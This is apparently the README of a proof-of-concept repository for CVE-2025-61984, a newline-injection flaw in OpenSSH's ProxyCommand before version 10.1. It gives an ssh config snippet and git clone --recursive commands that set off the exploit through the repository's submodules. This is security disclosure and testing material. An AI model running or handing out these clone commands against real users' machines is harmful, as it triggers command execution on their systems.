# CVE-2025-61984 PoC

This is a proof of concept using a newline to confuse OpenSSH's <10.1
ProxyCommand. [Full write
up](https://dgl.cx/2025/10/bash-a-newline-ssh-proxycommand-cve-2025-61984).

## How to run

Set up an `.ssh/config` containing:

```
Host *.example.com
  ProxyCommand some-command %r@%h:%p
```

(The command doesn't matter, it just needs an unquoted %r in the arguments
somewhere.)

Then run (for bash):

```
$ git clone --recursive https://github.com/dgl/cve-2025-61984-poc
```

Or if using fish as `$SHELL`:

```
git clone --recursive -b fish https://github.com/dgl/cve-2025-61984-poc
```

If you're not using the shell but want to test this, you can do:

```
$ SHELL=/bin/bash git clone --recursive https://github.com/dgl/cve-2025-61984-poc
```
